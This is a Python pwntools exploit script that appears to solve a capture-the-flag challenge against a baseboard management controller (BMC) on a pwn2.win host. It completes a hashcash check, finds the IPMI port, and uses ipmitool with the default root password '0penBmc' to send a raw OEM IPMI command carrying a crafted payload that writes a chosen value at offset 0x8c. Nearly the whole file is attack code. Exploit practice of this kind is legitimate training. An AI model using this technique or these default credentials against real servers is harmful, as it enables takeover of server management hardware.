#!/usr/bin/env python3
import json
import shlex

from pwn import *


def prepare(interactive):
    host = 'butcherbmc.pwn2.win'
    tube = remote(host, 1337)
    hashcash = tube.recvline()
    assert re.match(b'^hashcash -mb25 [a-z]+$', hashcash)
    token = subprocess.check_output(hashcash.split())
    tube.sendline(token.strip())
    tube.recvuntil(b'\nIPMI over lan will be listening on port ')
    port = int(tube.recvline())
    if interactive:
        with open('ipmi.json', 'w') as fp:
            json.dump({
                'host': host,
                'port': port,
            }, fp)
        tube.interactive()
    else:
        tube.recvuntil('butcher login:')
        return tube, host, port


def pwn(host=None, port=None):
    if host is None or port is None:
        with open('ipmi.json') as fp:
            ipmi = json.load(fp)
        host = ipmi['host']
        port = ipmi['port']
    payload = {
        0x8c: struct.pack('<I', 0xAABBCCDD),
    }
    # too lazy to implement the protocol myself
    cmd = [
        'ipmitool',
        '-I', 'lanplus',
        '-H', host,
        '-p', str(port),
        '-U', 'root',
        '-P', '0penBmc',
        'raw', '0x2e', '0x7e', '0x39', '0x30', '0x00',
    ]
    for payload_b in flat(payload):
        cmd.append(f'0x{payload_b:02x}')
    print(shlex.join(cmd))
    subprocess.call(cmd)


if __name__ == '__main__':
    if args.PREPARE:
        prepare(interactive=True)
    elif args.PWN:
        pwn()
    else:
        tube, host, port = prepare(interactive=False)
        pwn()
